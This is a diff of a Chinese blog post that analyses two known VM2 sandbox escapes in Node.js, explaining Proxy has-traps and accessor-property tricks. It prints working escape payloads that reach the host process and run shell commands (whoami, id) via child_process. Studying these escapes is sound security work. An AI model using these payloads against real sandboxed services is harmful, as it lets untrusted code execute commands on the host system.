@@ -286,15 +286,15 @@
           </header>
         
         <div class="entry-content">
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>VM2中在版本的更迭中存在多种逃逸方法，可以参考<a href="https://github.com/patriksimek/vm2/issues?q=is:issue+author:XmiliaH+is:closed" target="_blank" rel="noopener">issues</a>但是其中没有给出具体的分析，👇会通过几个典型的案例来分析这些代码是如何逃逸VM2沙箱的</p>
-<p>在学习本文前需要先简单了解<a href="https://0xgeekcat.github.io/%E5%AD%A6%E4%B9%A0ES6%E5%8E%9F%E7%94%9FProxy%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0.html#Proxy%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0">proxy构造函数</a></p>
-<h1 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h1><pre><code class="javascript">&quot;use strict&quot;;
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>VM2中在版本的更迭中存在多种逃逸方法，可以参考<a href="https://github.com/patriksimek/vm2/issues?q=is:issue+author:XmiliaH+is:closed" target="_blank" rel="noopener">issues</a>；但是其中没有给出具体的分析，👇会通过几个典型的案例来分析这些代码是如何逃逸VM2沙箱</p>
+<h1 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h1><p><strong>沙箱逃逸代码</strong></p>
+<pre><code class="javascript">&quot;use strict&quot;;
 const {VM} = require(&#39;vm2&#39;);
 const untrusted = `var process;
 Object.prototype.has=(t,k)=&gt;{
     process = t.constructor(&quot;return process&quot;)();
 }
-&quot;&quot; in Buffer.from;
+&quot;&quot; in Buffer;
 process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()`
 try{
     console.log(new VM().run(untrusted));
@@ -312,8 +312,8 @@ Object.prototype.has = function () { 👈 将has定义在原型链上
 
 proxy.a → get trap
 &#39;&#39; in proxy → has trap</code></pre>
-<p>在空对象 <code>target</code> 上定义 <code>get</code> 陷阱会拦截对象属性的读取，所以当访问 <code>proxy.a</code> 时，会打印出 <code>get trap</code></p>
-<p>当执行<code>&#39;&#39; in proxy</code>时会被<code>has</code>陷阱拦截，此时虽然没有直接在<code>target</code>对象上定义<code>has</code>拦截操作，但<code>handler</code>继承自<code>Object.prototype</code></p>
+<p>在空对象<code>target</code>上定义<code>get</code>陷阱会拦截对象属性的读取，所以当访问<code>proxy.a</code>时，会打印出<code>get trap</code></p>
+<p>当执行<code>&#39;&#39; in proxy</code>时会被<code>has</code>陷阱拦截，此时虽然没有直接在<code>target</code>对象上定义<code>has</code>拦截操作，但<code>handler</code>对象继承自<code>Object.prototype</code></p>
 <p><strong>回到VM2逃逸的代码，👇VM2中实际运行的代码</strong></p>
 <pre><code class="javascript">&quot;use strict&quot;;
 
@@ -323,8 +323,125 @@ Object.prototype.has = function (t, k) {
     process = t.constructor(&quot;return process&quot;)();
 };
 
-&quot;&quot; in Buffer.from;
+&quot;&quot; in Buffer;
 process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</code></pre>
+<p>**<a href="https://0xgeekcat.github.io/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3Node.js%E6%B2%99%E7%AE%B1%E7%8E%AF%E5%A2%83%E5%B9%B6%E5%88%86%E6%9E%90VM2%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.html#vm2-API"><code>Buffer</code>在<code>ontextify.js</code>中经过<code>Proxy</code>代理封装</a>**，vm2的作者一开始并没有给vm2内部的Object 加上<code>has trap</code>，所以可以通过给 <code>Object</code>对象的原型上添加<code>has trap</code></p>
+<p>运行<code>&quot;&quot; in Buffer;</code>就会执行已经定义好的<code>has trap</code></p>
+<p><strong>👇方便调试观察数据修改代码</strong></p>
+<pre><code class="javascript"># index.js
+&quot;use strict&quot;;
+const {VM, VMScript} = require(&#39;vm2&#39;);
+const {readFileSync} = require(&#39;fs&#39;)
+const untrusted = new VMScript(readFileSync(&#39;nop.js&#39;), &#39;nop.js&#39;);
+try{
+    console.log(new VM().run(untrusted));
+}catch(x){
+    console.log(x);
+}</code></pre>
+<pre><code class="javascript"># nop.js
+var process;
+Object.prototype.has=(t,k)=&gt;{
+    t
+    t.constructor
+    process = t.constructor(&quot;return process&quot;)();
+}
+&quot;&quot; in Buffer;
+console.log(Buffer)
+process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</code></pre>
+<p><img src="%E5%AD%A6%E4%B9%A0Node-js-VM2-sandbox-escapse/screenshot.png" alt="screenshot"></p>
+<p>由于<code>proxy</code>的机制，参数<code>t</code>的数据类型是<code>function</code>，这个<code>function</code>在外部，其上下文是nodejs的global，所以访问其<code>constructor</code>属性就获取到外部的<code>Function</code>，从而拿到外部的<code>process</code></p>
+<h1 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h1><pre><code class="javascript">&quot;use strict&quot;;
+const {VM} = require(&#39;vm2&#39;);
+const untrusted = `var process;
+try{
+    let a = Buffer.from(&quot;&quot;)
+    Object.defineProperty(a, &quot;&quot;, {
+        get set(){
+            Object.defineProperty(Object.prototype,&quot;get&quot;,{
+                get(){
+                    throw x=&gt;x.constructor(&quot;return process&quot;)();
+                }
+            });
+            return ()=&gt;{};
+        }
+    });
+}catch(e){
+    process = e(()=&gt;{});
+}
+process.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString();`;
+try{
+    console.log(new VM().run(untrusted));
+}catch(x){
+    console.log(x);
+}</code></pre>
+<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p><strong>JavaScript对象中存在三种不同的属性</strong></p>
+<ul>
+<li>数据属性</li>
+<li>访问器属性</li>
+<li>内部属性</li>
+</ul>
+<p>数据属性和访问器属性都存在<code>[[Enumerable]]</code>和<code>[[Configurable]]</code>特性</p>
+<p><strong>👇数据属性</strong></p>
+<ul>
+<li><code>[[Value]]</code>：该属性的属性值，默认为<code>undefined</code></li>
+<li><code>[[Writable]]</code>：是一个布尔值，表示属性值（<code>value</code>）是否可改变（即是否可写），默认为<code>true</code></li>
+</ul>
+<p><strong>👇访问器属性</strong></p>
+<ul>
+<li><code>[[Get]]</code>：是一个函数，表示该属性的取值函数（getter），默认为<code>undefined</code></li>
+<li><code>[[Set]]</code>：是一个函数，表示该属性的存值函数（setter），默认为<code>undefined</code></li>
+</ul>
+<p>通过<code>Object.defineProperty</code>设置对象的访问器属性</p>
+<pre><code class="javascript">let obj = {}
+Object.defineProperty(obj, &#39;prop&#39;, {
+    get() {
+        console.log(&quot;getter1&quot;) → getter1
+        return () =&gt; {return &quot;getter2&quot;}
+    }
+})
+
+console.log(obj.prop()) → getter2</code></pre>
+<p>👇先执行<code>get()</code>输出<code>getter1</code>之后返回匿名函数<code>() =&gt; {return &quot;getter2&quot;}</code>，当访问<code>obj.prop</code>时会调用匿名函数打印<code>getter2</code></p>
+<pre><code class="javascript">let obj = {}
+Object.defineProperty(obj, &#39;prop&#39;, {
+    get get() {
+        console.log(&quot;getter1&quot;) → getter1
+        return () =&gt; {return &quot;getter2&quot;}
+    }
+})
+
+console.log(obj.prop) → getter2</code></pre>
+<p>对👆代码进行简单修改</p>
+<pre><code class="javascript">let obj = {}
+Object.defineProperty(obj, &#39;prop&#39;, {
+    get set() { 👈 看仔细
+        console.log(&quot;setter1&quot;) → setter1
+        return (val) =&gt; {console.log(&quot;setter2&quot;)}
+    }
+})
+
+obj.prop = 1 → setter2</code></pre>
+<p>执行<code>set()</code>打印出<code>setter1</code>，同时设置<code>prop</code>的setter为<code>(val)=&gt;{console.log(&quot;setter2&quot;)}</code>；执行<code>obj.prop=1</code>时打印<code>setter2</code></p>
+<p><strong>了解完基础知识后分析逃逸代码</strong></p>
+<pre><code class="javascript">var process;
+try{
+    let a = Buffer.from(&quot;&quot;)
+    Object.defineProperty(a, &quot;&quot;, {
+        get set(){
+            Object.defineProperty(Object.prototype,&quot;get&quot;,{
+                get(){
+                    throw x=&gt;x.constructor(&quot;return process&quot;)();
+                }
+            });
+            return ()=&gt;{};
+        }
+    });
+}catch(e){
+    process = e(()=&gt;{});
+}
+process.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString();</code></pre>
+<p><img src="%E5%AD%A6%E4%B9%A0Node-js-VM2-sandbox-escapse/screenshot%201.png" alt="screenshot 1"></p>
+<p><strong>❌此操作过于梦幻，暂不研究</strong></p>
 
         </div>
         <!-- .entry-content -->
